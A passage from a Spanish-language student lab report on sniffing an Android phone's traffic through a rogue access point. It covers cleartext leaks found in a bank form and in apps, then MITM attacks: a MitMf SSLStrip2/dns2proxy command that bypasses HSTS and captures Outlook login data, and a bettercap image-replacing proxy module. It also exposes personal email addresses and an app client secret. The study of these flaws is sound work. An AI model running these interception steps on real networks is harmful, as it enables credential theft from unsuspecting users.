\section{Pruebas y resultados}

Para nuestras pruebas, conectamos un celular android a nuestro Rogue AP y nos pusimos a analizar el tráfico con varias herramientas y configuraciones. Algunas de ellas fueron las siguientes:

Wireshark para dumpear todo el tráfico sin filtros a un archivo pcap
Httpry para capturar el tráfico http y https que viaja por la red
Tcpdump sobre el puerto 53 para ver los requests dns que se originaban

Además, decidimos dividir las pruebas en las siguientes categorías que consideramos interesantes para el análisis:

Requests realizadas con el celular bloqueado
Requests realizadas cuando se navega por internet a diferentes páginas
A páginas con https
A páginas sin https
Requests realizadas cuando se actualizan aplicaciones
Requests realizadas durante el uso de algunas aplicaciones
Requests realizadas cuando se realiza un llamado????


Análisis de tráfico generado con el celular en stand-by
Para realizar esta prueba, conectamos el celular al nuestro rogue AP y lo bloqueamos, dejándolo en stand-by. Luego, ejecutamos tcpdump para capturar todos los requests realizamos desde y hacia la el teléfono, el cual en el momento de la prueba, tenía la IP 10.0.0.168. A partir del análisis de las requests pudimos notar lo siguiente:

El celular realiza varias varias requests a diferentes servicios de google. Pudimos ver pedidos por el puerto 53 de direcciones DNS de servicios de google como “www.google.com”, “www.googleapis.com”, “playatoms-pa.googleapis.com”.
	
15:31:57.811956 IP 10.0.0.168.49417 > kali.domain: 14765+ A? www.googleapis.com. (36)
15:31:57.826415 IP kali.domain > 10.0.0.168.49417: 14765 4/4/4 CNAME googleapis.l.google.com., A 172.217.30.138, A 172.217.30.170, A 172.217.28.202 (254)
15:31:57.848861 IP 10.0.0.168.55359 > eze03s35-in-f10.1e100.net.https: Flags [S], seq 261817987, win 65535, options [mss 1460,sackOK,TS val 39032974 ecr 0,nop,wscale 8], length 0
15:31:57.861598 IP eze03s35-in-f10.1e100.net.https > 10.0.0.168.55359: Flags [S.], seq 358949, ack 261817988, win 64240, options [mss 1460], length 0
15:31:57.866169 IP 10.0.0.168.55359 > eze03s35-in-f10.1e100.net.https: Flags [.], ack 1, win 65535, length 0

Evidentemente, más allá de estar bloqueado el teléfono, este interactúa con varios servicios de google, lo cual no nos sorprende dado que es un celular de Android y estamos conectados con una cuenta de Google y varios de sus servicios asociados.

Se realizan requests hacia dominios relacionados con whatsapp, probablemente para verificar si hay mensajes nuevos y poder notificarlos. Lo más interesante de esto, es que el pedido DNS de este dominio de whatsapp nos devolvió un IP perteneciente a Telecentro (nuestra interfaz eth0 está proviste por el ISP Telecentro). Esto es interesante dado que nos da la noción de que, más allá de que no puedan ver el tráfico que se envía de whatsapp, si puedan estar midiendo el tráfico de whatsapp que viaja por su red.

15:37:36.278210 IP 10.0.0.168.53258 > kali.domain: 6586+ A? Mmg-fna.whatsapp.net. (38)
15:37:36.296058 IP kali.domain > 10.0.0.168.53258: 6586 2/2/4 CNAME mmx-fb.cdn.whatsapp.net., A 186.19.254.33 (202)
15:37:36.334629 IP 10.0.0.168.47623 > cpe-186-19-254-33.telecentro-reversos.com.ar.https: Flags [S], seq 3654449117, win 65535, options [mss 1460,sackOK,TS val 39044739 ecr 0,nop,wscale 8], length 0
15:37:36.346152 IP cpe-186-19-254-33.telecentro-reversos.com.ar.https > 10.0.0.168.47623: Flags [S.], seq 189809644, ack 3654449118, win 64240, options [mss 1460], length 0

Se realizan también requests a dominios relaciones con Google Ads, lo cual es bastante extraño dado que el celular esta bloqueado, sin ningún navegador abierto y por lo tanto ninguna publicidad se está mostrando.

15:47:03.847475 IP 10.0.0.168.39297 > kali.domain: 53235+ A? googleads.g.doubleclick.net. (45)
15:47:03.859980 IP kali.domain > 10.0.0.168.39297: 53235 2/4/4 CNAME pagead46.l.doubleclick.net., A 172.217.28.194 (232)
15:47:03.867331 IP 10.0.0.168.42008 > eze03s30-in-f2.1e100.net.https: Flags [S], seq 964055324, win 65535, options [mss 1460,sackOK,TS val 39170190 ecr 0,nop,wscale 8], length 0
15:47:03.888475 IP eze03s30-in-f2.1e100.net.https > 10.0.0.168.42008: Flags [S.], seq 2016752776, ack 964055325, win 64240, options [mss 1460], length 0

Detectamos también interacción con los servidores de Netflix (dado que tenemos la aplicación instalada). Dado que no estábamos viendo nada ni tampoco teníamos la aplicación abierta, suponemos que Netflix trackea nuestro comportamiento o envía información de nuestro celular hacia sus servidores.

15:50:54.384017 IP 10.0.0.168.36715 > kali.domain: 16303+ A? api-global.netflix.com. (40)
15:50:56.404897 IP kali.domain > 10.0.0.168.36715: 16303 10/4/6 CNAME api-global.geo.netflix.com., CNAME api-global.us-east-1-sa.prodaa.netflix.com., A 54.164.212.172, A 54.164.49.61, A 54.173.178.127, A 54.210.30.204, A 54.164.207.213, A 54.173.250.49, A 54.164.216.123, A 54.152.71.86 (499)
15:50:57.433861 IP 10.0.0.168.34703 > ec2-54-164-212-172.compute-1.amazonaws.com.https: Flags [S], seq 4072206306, win 65535, options [mss 1460,sackOK,TS val 39227017 ecr 0,nop,wscale 8], length 0

Encontramos requests UDP a la ip 239.255.255.250. Al principio nos pareció extraño pero luego de investigar un poco nos dimos cuenta que son requests relacionadas con el Simple Service Discovery Protocol (SSDP) que se utiliza para descubrir a otros dispositivos de la red.

	15:50:57.728650 IP 10.0.0.168.53028 > 239.255.255.250.1900: UDP, length 125
15:50:57.728679 IP 10.0.0.168.53028 > 239.255.255.250.1900: UDP, length 125

Detectamos pedidos DNS de apis de Facebook, e inmediatamente hacia algo llamado Crashlytics. El celular usado para las pruebas no tiene Facebook ni nada relacionado instalado, con lo cual intuímos que esto esta relacionado con Whatsapp, el cual es propiedad de Facebook. Lo interesante es que más allá de estos pedidos, no se realizan requests a las ips asociadas. Investigando un poco más, nos encontramos que Crashlytics es un servicio que puede incluir en apps de celulares y que permite trackear cuando las aplicaciones crashean. La conclusión que podemos obtener es que Facebook debe querer trackear cuando sus aplicaciones fallan, específicamente en este caso, cuando Whatsapp falla.

15:53:57.005173 IP 10.0.0.168.60043 > kali.domain: 10722+ A? Graph.facebook.com. (36)
15:53:57.019333 IP kali.domain > 10.0.0.168.60043: 10722 3/2/4 CNAME api.facebook.com., CNAME star.c10r.facebook.com., A 179.60.193.16 (217)
15:53:57.107599 IP 10.0.0.168.48137 > kali.domain: 13728+ A? settings.crashlytics.com. (42)
15:53:57.122040 IP kali.domain > 10.0.0.168.48137: 13728 9/4/6 CNAME settings-crashlytics-b-103974621.us-east-1.elb.amazonaws.com., A 23.23.141.81, A 23.23.115.241, A 23.23.154.246, A 23.23.135.166, A 23.23.100.184, A 23.23.159.200, A 23.23.145.88, A 23.23.151.233 (498)

Se realizan requests hacia la api de AccuWeather probablemente para actualizar el clima que muestra integrado en casi todos los teléfonos android

16:12:30.630286 IP 10.0.0.168.53667 > kali.domain: 45159+ A? api.accuweather.com. (37)
16:12:30.643028 IP kali.domain > 10.0.0.168.53667: 45159 3/9/9 CNAME api.accuweather.com.edgekey.net., CNAME e10414.g.akamaiedge.net., A 23.12.155.157 (450)

También tenemos requests de la aplicación de Outlook para android y de Skype.

16:15:09.755357 IP 10.0.0.168.48568 > kali.domain: 45520+ A? Outlookmobile-office365-tas.msedge.net
16:15:09.768672 IP kali.domain > 10.0.0.168.48568: 45520 3/2/2 CNAME outlookmobile-office365-tas-msedge-net.e-0009.e-msedge.net., CNAME e-0009.e-msedge.net., A 13.107.5.88 (223)
16:15:12.203729 IP 10.0.0.168.53945 > kali.domain: 55377+ A? Mobile.pipe.aria.microsoft.com
16:15:12.216609 IP kali.domain > 10.0.0.168.53945: 55377 5/10/5 CNAME prd.col.aria.mobile.skypedata.akadns.net., CNAME pipe.skype.com., CNAME pipe.prd.skypedata.akadns.net., CNAME pipe.cloudapp.aria.akadns.net., A 40.117.100.83 (504)

Un tipo de request interesante que encontramos fue hacia un dominio llamado 	arethusa.tweakers.net utilizando el protocolo NTPv3, el cual permite el chequeo y sincronización de relojes. Buscando un poco sobre más sobre este dominio, pudimos encontrar que es un dominio holandés, con IP 213.239.154.12. Buscando por esa IP, pudimos encontrar que suele ser utilizada en configuraciones para el NTP. Evidentemente, se suele utilizar para sincronizar relojes.

Análisis de tráfico inseguro generado por navegación web
Una de las primeras cosas que notamos, a partir de los datos de Wireshark, es la gran cantidad de paquetes de dos tipos, TCP Retransmission y TCP Dup ACK, cuando se esta navegando por la web e ingresando a diferentes páginas. Investigando un poco más, llegamos a la conclusión de que esto puede deberse al uso de TCP Fast Retransmit. TCP Fast Retransmit es un mecanismo mediante el cual un receptor puede indicar que ha visto un espacio en los números de secuencia recibidos lo cual implica la pérdida de uno o más paquetes en tránsito. A partir de los últimos ACK recibidos se determina que paquetes deben retransmitir el remitente. Esto puede ocurrir sin esperar el tiempo de espera de ACK para que el paquete perdido impacte en el transmisor, lo que, como su nombre lo indica, significa una recuperación mucho más rápida. Es decir, dado que nuestro Rogue AP, los requests son recibidos, analizados y forwardeados a la placa de red que esta conectada a la internet, es posible que este overhead en tiempo que se produce haga que los paquetes se retransmitan dado que los ACK tardan demasiado en llegar. Sin embargo, del lado de la persona que está esperando que le cargue la página en el celular, el tiempo de espera de carga sigue dentro de un rango normal más allá de estas pequeñas demoras.

En primera instancia. Intentamos buscar alguna página que maneje datos sensibles que tenga problemas de seguridad o que mande datos relevantes de un usuario en claro. Se nos ocurrió probar con entrar a las versiones mobile de las páginas de los bancos. Es aquí donde nos encontramos con la página mobile del banco hipotecario, m.hipotecario.com.ar. Obviamente, como cualquier banco, loguearse al home banking del mismo es imposible si no se está sobre HTTPS. Sin embargo, intentamos buscar otro punto por donde información sensible pueda sniffearse. De esta manera, encontramos la página de “Contáctenos”, lo cual a simple vista parece inofensivo. Completamos el formulario con datos de prueba y al analizar el request nos encontramos lo siguiente:

2017-11-19 00:04:47	10.0.0.168	200.124.126.18	>	POST	m.hipotecario.com.ar	/EnviarFormulario	HTTP/1.1	-	-
2017-11-19 00:04:47	200.124.126.18	10.0.0.168	<	-	-	-	HTTP/1.1	200	OK

--------PAYLOAD-----------
nombre=Aaaaa&apellido=Bbbbb&dni=111111111&email=Aaaa%40bbbb.com&celular=11111111&consulta=Test+%7C+Es+Cliente&CaptchaCode=052&EncData=%2FCJ15Ehz0%2BK6sKWFhkwafRVmAm5t2TOT
--------------------------------

El problema de esta página radica en que se solicitan varios datos, entre los cuales están el email, el dni y la información de si es o no cliente. Ahora supongamos que la persona pone su DNI, su email y especifica que es cliente del banco. Entonces, con toda esta información, un atacante podría generar emails para tratar de engañar a la persona solicitándole entrar a un home banking falso con un link malicioso y robarle sus datos bancarios. Es por eso que información tan sensible como si se es o no cliente de un banco junto con documento y otros datos personales debe viajar cifrado para evitar que algún tercero utilice estos datos a su beneficio.


Tráfico generado al instalar una aplicación
Para poder realizar este análisis sobre la instalación de una aplicación, nos ubicamos dentro del Play Store de Google, seleccionamos una aplicación (de unos 18MB aproximadamente), y luego estando en este lugar, utilizamos tcpdump para intentar capturar todo el tráfico desde y hacia el dispositivo al elegir la opción de instalar. El tráfico generado constó de lo siguiente:

Primero se realiza un request dns a play.googleapis.com
Sucede algún intercambio por HTTPS con un servidor de Google, dado que pertenece al dominio *.1e100.net que es propiedad de Google.
Se realiza un request dns a android.clients.google.com
Se intercambian paquetes UDP y TCP entre nuestro dispositivo y otro servidor de Google
Luego hay un request dns a r7---sn-uxaxjxougv-x1xz.gvt1.com, lo cual está dentro del dominio de Google, dado que al poner la URL en el navegador el error 404 es el de Google. Suponemos que este es el servidor designado el cual nos enviará los datos necesarios para instalar la aplicación, y que el mismo surgió de la comunicación del paso anterior.
Finalmente, sucede la comunicación de los datos para instalar la aplicación mediante HTTPS entre dispositivo y servidor. 

Análisis del uso de red en aplicaciones
Prueba de trackeo de datos

Para esta prueba, buscamos ver con que servicios se comunican las aplicaciones, especialmente si realizan requests de trackeo o a dominios extraños. 
Un buen ejemplo de trackeo de información del dispositivo podemos observarlo en la aplicación de MercadoLibre. La misma realiza requests de trackeo en intervalos de tiempo cortos. Para verlo usamos httpry y Wireshark.

Log de httpry. Claramente la url nos está diciendo a la cara que está trackeando información.

2017-11-18 22:57:26	10.0.0.168	34.235.240.12	>	POST	data.mercadolibre.com	/tracks	HTTP/1.1	-	-
2017-11-18 22:57:27	34.235.240.12	10.0.0.168	<	-	-	-	HTTP/1.1	200	OK

Payload de Wireshark. Como se puede ver, información relevante del dispositivo, como la versión de android, el modelo de celular, tamaño de pantalla, etc. es enviada por HTTP.

	POST /tracks HTTP/1.1
Content-Encoding: gzip
X-melidata-site: MLA
X-melidata-sdk-version: 0.1
X-device-timestamp: 2017-11-19T00:41:24.491-0300
X-device-time: 1511062884491
Content-Type: application/json
Content-Length: 3056
Host: data.mercadolibre.com
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/2.2.0	"tracks":[{"application":{"app_id":"7092","site_id":"MLA","version":"8.13.3","business":"mercadolibre"},"sequential_id":1899,"device":{"platform":"/mobile/android","resolution_width":720.0,"resolution_height":1184.0,"device_id":"52c0d4d328a147de","auto_time":true,"device_name":"Moto G Play","os_version":"6.0.1","orientation":0.0,"connectivity_type":"WIFI"},"event_data":{},"experiments":{},"id":"572e21cb-f049-49c1-80cb-634fb78b3afe","path":"/application/open","platform":{"mobile":{"mode":"normal"}},"priority":"NORMAL","retry":0,"secure":false,"type":"event","user":{"advertiser_id":"d7fd17bc-8076-4ac9-9a07-43e682e3afc2","uid":"9d7596539941b227"},"user_time":1511062870669,"user_local_timestamp":"2017-11-19T00:41:10.669-0300"}]

Prueba de tráfico no cifrado

Gran parte de las aplicaciones que testeamos envían algún tipo de información mediante HTTP la cual no viaja cifrada. La mayoría de esta información no lleva información relevante del usuario de la misma, más que el modelo de celular y versión del sistema operativo. Sin embargo, nos hemos encontrado con alguna excepciones donde información que debería ser confidencial y viajar cifrada no lo hace. Este es el caso de la aplicación de Unicenter, la cual envía tanto el usuario como la clave para loguearse en la misma mediante HTTP, por lo que pudimos detectarlo con httpry y revisar el payload con wireshark. 

Log de httpry. La url y el hecho de que sea un request de tipo POST ya nos hizo sospechar que algo andaba mal aquí.

2017-11-18 23:01:50	10.0.0.168	23.20.233.135	>	POST	unicenter.cencosudshopmobile.com.ar	/oauth/access_token	HTTP/1.1	-	-
2017-11-18 23:01:52	23.20.233.135	10.0.0.168	<	-	-	-	HTTP/1.1	200	OK
2017-11-18 23:01:52	23.20.233.135	10.0.0.168	<	-	-	-	HTTP/1.1	200	OK

Payload del request en Wireshark. Claramente aquí se puede ver que tanto el usuario como la clave viajan en claro. Hemos escondido manualmente la clave con asteriscos para proteger la confidencialidad de la misma.

POST /oauth/access_token HTTP/1.1
Content-Type: application/json; charset=utf-8
Content-Type: application/json; charset=utf-8
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; Moto G Play Build/MPI24.241-2.47-19-1)
Host: unicenter.cencosudshopmobile.com.ar
Connection: Keep-Alive
Accept-Encoding: gzip
Content-Length: 149
{"grant_type":"password","username":"famfede@gmail.com","password":"********","client_id":"android","client_secret":"OX011HNR3Lpt870JAl1Rb8MM88BE27j8"}


Prueba de reintentos innecesarios

Para esta prueba instalamos una aplicación la cual tiene como función analizar todos los dispositivos que estén presentes dentro de la red de nuestro celular de prueba. Esta aplicación se llama “Quién usa mi wifi Herramienta de red”. Con las herramientas que ya venimos utilizando (Wireshark, tcpdump y httpry) analizamos su comportamiento durante el escaneo de los dispositivos de la red. Lo primero que notamos es que la aplicación comienza a enviar paquetes ARP who has a toda las direcciones IP de la red. 

14:27:37.088325 ARP, Request who-has 10.0.0.3 tell 10.0.0.168, length 28
14:27:37.088354 ARP, Request who-has 10.0.0.3 tell 10.0.0.168, length 28
14:27:37.090301 ARP, Request who-has 10.0.0.2 tell 10.0.0.168, length 28
14:27:37.090333 ARP, Request who-has 10.0.0.2 tell 10.0.0.168, length 28
14:27:37.097901 ARP, Request who-has 10.0.0.4 tell 10.0.0.168, length 28
14:27:37.097922 ARP, Request who-has 10.0.0.4 tell 10.0.0.168, length 28
14:27:37.099722 ARP, Request who-has 10.0.0.5 tell 10.0.0.168, length 28
14:27:37.099744 ARP, Request who-has 10.0.0.5 tell 10.0.0.168, length 28
14:27:37.101717 ARP, Request who-has 10.0.0.7 tell 10.0.0.168, length 28
14:27:37.101737 ARP, Request who-has 10.0.0.7 tell 10.0.0.168, length 28
14:27:37.105791 ARP, Request who-has 10.0.0.8 tell 10.0.0.168, length 28
14:27:37.105810 ARP, Request who-has 10.0.0.8 tell 10.0.0.168, length 28
14:27:37.108061 ARP, Request who-has 10.0.0.6 tell 10.0.0.168, length 28
14:27:37.108081 ARP, Request who-has 10.0.0.6 tell 10.0.0.168, length 28
14:27:37.110164 ARP, Request who-has 10.0.0.9 tell 10.0.0.168, length 28
14:27:37.110183 ARP, Request who-has 10.0.0.9 tell 10.0.0.168, length 28
…….

Sin embargo, podemos notar que no manda uno, si no 2 paquetes ARP por IP, lo cual no esta del todo bien ya que, suponiendo que el request ARP no se pierde, con uno sería suficiente. Lo que es peor aún, es que más allá de esta duplicación de paquetes ARP, cada cierta cantidad de paquetes ARP vuelve a enviar who has a IPs que ya lo había hecho antes.

…..
14:27:37.198176 ARP, Request who-has 10.0.0.38 tell 10.0.0.168, length 28
14:27:37.198196 ARP, Request who-has 10.0.0.38 tell 10.0.0.168, length 28
14:27:37.202861 ARP, Request who-has 10.0.0.40 tell 10.0.0.168, length 28
14:27:37.202880 ARP, Request who-has 10.0.0.40 tell 10.0.0.168, length 28
14:27:37.204847 ARP, Request who-has 10.0.0.39 tell 10.0.0.168, length 28
14:27:37.204868 ARP, Request who-has 10.0.0.39 tell 10.0.0.168, length 28
14:27:38.091373 ARP, Request who-has 10.0.0.3 tell 10.0.0.168, length 28
14:27:38.091392 ARP, Request who-has 10.0.0.3 tell 10.0.0.168, length 28
14:27:38.092884 ARP, Request who-has 10.0.0.2 tell 10.0.0.168, length 28
14:27:38.092904 ARP, Request who-has 10.0.0.2 tell 10.0.0.168, length 28
14:27:38.096138 ARP, Request who-has 10.0.0.4 tell 10.0.0.168, length 28
14:27:38.096156 ARP, Request who-has 10.0.0.4 tell 10.0.0.168, length 28
14:27:38.098022 ARP, Request who-has 10.0.0.5 tell 10.0.0.168, length 28
14:27:38.098041 ARP, Request who-has 10.0.0.5 tell 10.0.0.168, length 28
…..
 
Calculando correctamente los intervalos, pudimos descubrir que envía paquetes ARP de a 40 direcciones IP, 3 veces por cada intervalo antes de pasar al siguiente. Esto claramente son una gran cantidad de reintentos innecesarios, ya que dado que se envían 2 paquetes ARP por IP y cada segmento se recorre 3 veces, entonces por cada IP de nuestra red se envían 6 paquetes ARP del mismo tipo. 

Cabe destacar además, que durante el escaneo, se produjeron una gran cantidad de requests a servidores de Google. La aplicación tiene anuncios de Google AdWords, pero más allá de los necesarios para cargar el único anuncio que se mostró en la aplicación, muchos otros requests extras se generaron de los cuales no pudimos determinar su intención.



MITM

El MitM (o Man-in-the-Middle) es un ataque en el que se adquiere la capacidad de leer, insertar y modificar a voluntad la información que esta en viaje. El atacante debe ser capaz de observar e interceptar mensajes entre las dos víctimas los mensajes entre dos partes sin que ninguna de ellas conozca que el enlace entre ellos ha sido violado. 

Para nuestro caso, utilizaremos un herramienta llamada MitMf, la cual es un framework que recopila varias herramientas conocidas (como ssltrip2 y dns2proxy) para permitirnos hacer este tipo de ataques. 

Nuestra intención con este framework es poder capturar información que viaja en la red y modificarla. A continuación, enumeramos las pruebas realizadas y los resultados que obtuvimos con la mismas.

Downgrade de conexiones HTTPS a HTTP con SSLStrip

Cuando nuestro dispositivo de prueba se conecta a alguna página que utiliza HTTPS, se genera una conexión segura que impide que podamos ver el tráfico real que esta en viaje para esa conexión. SSLStrip es una herramienta que permite quitar los headers https de la conexión y forzar a que la misma se realize por http. O sea, convierte todo lo que sea https:// en http://. De esta manera, si bien nosotros siempre vamos a querer conectarnos de manera segura por https a algún servicio o página web, SSLStrip nos fuerza a hacerlo de manera insegura.

Sin embargo, luego de realizar algunas pruebas con el mismo, nos dimos cuenta que no funciona tan bien como esperábamos, dado que es afectado en gran parte por los headers HSTS. HSTS (HTTP Strict Transport Security) es una política de seguridad web establecida para evitar ataques que puedan interceptar comunicaciones, cookies, etc. Según este mecanismo un servidor web declara que los navegadores solamente pueden interactuar con ellos mediante conexiones HTTPS. 

Al día de hoy la mayoría de los sitios de gran uso, como pueden ser Paypal, Gmail, Facebook, Twitter, Outlook, etcétera, utilizan el header HSTS para que los navegadores que lo soportan, que a día de hoy son todos, sepan que cuando el usuario introduzca el dominio en la barra de direcciones sin especificar el protocolo, se debe acceder siempre a través de HTTPS. De este modo, nunca se realizará una petición HTTP a un dominio que use HSTS y evitará que un atacante en medio puedo hacer un esquema de SSLStrip. Es por esto, si bien SSLStrip reemplaza por http://, el navegador vuelve a forzarlo a https:// gracias a este header, por lo que nuestra pruebas con esta herramienta no fueron para nada interesantes.

Eliminando HSTS con SSLStrip2 y dns2proxy

Para resolver este problema que tenemos con el header HSTS, vamos a utilizar la nueva versión de SSLStrip, llamada SSLStrip2 o SSLStrip+, en conjunto con dns2proxy. Estos nos permitirán quitar todo header HSTS que se pueda aparecer en los headers de las conexiones (SSLStrip2) y nos redireccionarán a un dominio falso que se haga pasar por el verdadero pero que funcione sobre HTTP para poder capturar el tráfico (dns2proxy). Para realizar esto configuramos que el domino outlook.live.com que nos permite ingresar a nuestras cuentas de outlook o hotmail personales, sea redirigido a weboutlook.live.com. 

Pusimos a correr nuestro rogue AP, desactivamos el dns que nos provee dnsmasq, y luego pusimos a correr MitMf con las opciones de hsts (SSLStrip2) y dns (dns2proxy) de la siguiente manera:

python mitmf.py -i wlan0 --hsts --dns

Luego, conectamos nuestro dispositivo de prueba al AP e intentamos acceder a outlook.com y estos fue lo que logueo mitmf:

2017-11-25 17:29:20 10.0.0.168 [type:Chrome Mobile-62 os:Android] outlook.com
2017-11-25 17:29:21 10.0.0.168 [DNS] Resolving 'wwww.outlook.com' to 'www.outlook.com' for HSTS bypass
2017-11-25 17:29:21 10.0.0.168 [type:Chrome Mobile-62 os:Android] www.outlook.com
2017-11-25 17:29:21 10.0.0.168 [type:Chrome Mobile-62 os:Android] Zapped a strict-transport-security header
2017-11-25 17:29:21 10.0.0.168 [DNS] Resolving 'weboutlook.live.com' to 'outlook.live.com' for HSTS bypass
2017-11-25 17:29:21 10.0.0.168 [type:Chrome Mobile-62 os:Android] outlook.live.com
2017-11-25 17:29:22 10.0.0.168 [type:Chrome Mobile-62 os:Android] Zapped a strict-transport-security header
2017-11-25 17:29:22 10.0.0.168 [type:Chrome Mobile-62 os:Android] Zapped a strict-transport-security header

Como se puede ver, mitmf capturo los requests a outlook.live.com y lo termino redirigiendo a weboutlook.live.com el cual mantiene una conexión del tipo HTTP pero se muestra como si fuera la página original para el usuario del dispositivo, y todos los requests que hagamos desde este dominio dns2proxy los forwardea al dominio original para que la navegación y el comportamiento del sitio parezca real. 

Paso siguiente, nos intentamos loguear al sitio poniendo nuestro email y un password erróneo para mostrar únicamente como capturamos el tráfico. A continuación se pueden ver los logs:

2017-11-25 17:30:45 10.0.0.168 [type:Chrome Mobile-62 os:Android] POST Data (login.live.com):
{"username":"fedomartinez@hotmail.com","uaid":"6624e94e138e428381c78633a1ab0e74","isOtherIdpSupported":false,"checkPhones":false,"isRemoteNGCSupported":true,"isCookieBannerShown":false,"isFidoSupported":false,"flowToken":"DQhHzeNTqKgxInlQhD31Nw0SsDGg7fJHgiMMlRv1h0E1CW!Aa4LxVqOMMnjVW6PLiF9GhG!OiSWI3hmjm7sieMn2*AysxGtCrV*OFOjsCncmhYVa*OLGWxKpw6wat5kyAk56pUr8xE*ac82nr6IWxvZ0XEIOqIHPMedKY2R2J*R47bzX34e7DNlSj1*lIXI6kAai7ZTgChw7YBHUQMyi!4cQTKAlGLTo28D*FPygvU!EG0OSa*mPnRxBol1fRmNZ3s5Unh2dDJgoQzFwDnSDswE$"}
2017-11-25 17:30:45 10.0.0.168 [type:Chrome Mobile-62 os:Android] Zapped a strict-transport-security header
2017-11-25 17:30:46 10.0.0.168 [type:Chrome Mobile-62 os:Android] auth.gfx.ms
2017-11-25 17:31:00 10.0.0.168 [type:Chrome Mobile-62 os:Android] POST Data (login.live.com):
i13=0&login=fedomartinez%40hotmail.com&loginfmt=fedomartinez%40hotmail.com&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=prueba&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&psFidoAllowList=&canary=&ctx=&PPFT=DQhHzeNTqKgxInlQhD31Nw0SsDGg7fJHgiMMlRv1h0E1CW%21Aa4LxVqOMMnjVW6PLiF9GhG%21OiSWI3hmjm7sieMn2*AysxGtCrV*OFOjsCncmhYVa*OLGWxKpw6wat5kyAk56pUr8xE*ac82nr6IWxvZ0XEIOqIHPMedKY2R2J*R47bzX34e7DNlSj1*lIXI6kAai7ZTgChw7YBHUQMyi%214cQTKAlGLTo28D*FPygvU%21EG0OSa*mPnRxBol1fRmNZ3s5Unh2dDJgoQzFwDnSDswE%24&PPSX=Pa&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&i2=36&i17=0&i18=__ConvergedLoginPaginatedStrings%7C1%2C__ConvergedLogin_PCore%7C1%2C&i19=71540

Claramente se puede ver que al generar una conexión HTTP a un dominio falso que se hace pasar por uno verdadero podemos interceptar información sensible que de otra manera no podríamos descifrar en una conexión HTTPS. En esta caso, tanto el mail como el password de nuestro dispositivo fueron comprometidos.

Intercepción y modificación de imágenes por HTTP
Para esta prueba, decidimos utilizar bettercap para modificar requests de imágenes que viajan por tráfico HTTP y redigirlas a otra imagen que nosotros especifiquemos. En este caso, dado que no encontramos un plugin de bettercap que nos permita redirigir imágenes, decidimos crear el nuestro propio. A continuación el código del mismo:


# encoding: UTF-8
# redirecttocat.rb

# This proxy module will redirect all images to a cat image.
class RedirectToCat < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'RedirectToCat',
    'Description' => 'This proxy module will redirect the target(s) images requests to a cat image.',
    'Version'     => '1.0.0',
    'Author'      => "Federico Martinez",
    'License'     => 'GPL3'
  )

  # Cat image URL
  @@url = 'http://www.catster.com/wp-content/uploads/2017/08/A-fluffy-cat-looking-funny-surprised-or-concerned.jpg'

  def on_request( request, response )
    if response.content_type =~ /^image\/.*/ and !@@url.include?(request.host)
      BetterCap::Logger.info "[#{'REDIRECT'.green}] Redirecting #{request.to_url} to cat ..."
      response.redirect!(@@url)
    end
  end
end

Básicamente, este plugin captura todas las requests HTTP que devuelven imágenes y la convierte en una imagen de un gato que nosotros especificamos. Pusimos a correr bettercap de la siguiente manera sobre la interfaz de nuestro rogue AP:

bettercap -I wlan0 --proxy-module redirecttocat.rb -T 10.0.0.168 -G 10.0.0.1 --no-spoofing

Luego, utilizando aplicaciones como Spotify o Mercadolibre que utilizan requests HTTP inseguras para imágenes, pudimos obtener resultados como el siguiente al querer ver el carousel de imágenes de una publicación de mercadolibre:
